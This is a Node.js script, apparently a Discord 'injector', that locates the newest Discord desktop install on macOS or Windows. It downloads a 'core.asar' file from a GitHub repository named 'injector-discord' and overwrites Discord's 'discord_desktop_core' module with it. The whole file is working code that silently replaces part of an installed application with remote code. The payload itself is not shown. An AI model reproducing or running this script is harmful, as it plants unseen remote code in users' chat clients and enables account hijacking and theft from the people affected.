const fs = require('fs')
const https = require('https')
var file = "https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/core.asar"

var path = ""

if (typeof String.prototype.replaceAll == "undefined") {  
    String.prototype.replaceAll = function(match, replace) {  
      return this.replace(new RegExp(match, 'g'), () => replace);  
    }  
  }
  
if(process.platform == "darwin") {
    path = process.env.HOME + "/Library/Application\ Support/discord"
}

if(process.platform == "win32") {
    path = (process.env.APPDATA).replace('Roaming', '') + "Local" + `\\` + "Discord"
}

const folders = fs.readdirSync(path, {withFileTypes: true})
.filter(file => file.isDirectory() == true)
.map(file => file.name)

const array = []

folders.forEach(f => {
    const num = parseInt(f.split('.').join('').replace('app-', ''))
    if(isNaN(num)) return
    else array.push([num, f])
})
const folder = array.sort((a, b) => b[0] - a[0])[0][1]

check(path + '/' + folder + '/modules/')
function check(def) {
    const folders2 = fs.readdirSync(def, {withFileTypes: true})
    .filter(file => file.isDirectory() == true)
    .map(file => file.name)
    folders2.forEach(f => {
        if(f == 'discord_desktop_core') {
            https.get(file, (res) => {
                const file = fs.createWriteStream(def + f + '/core.asar');
                res.pipe(file);
                file.on('finish', () => {
                    file.close();
                });
            }).on("error", (err) => {
                console.log("Error: ", err.message);
            });
        }
        else if(f.includes('discord_desktop_core')) check(def + f + '/')
    })
}
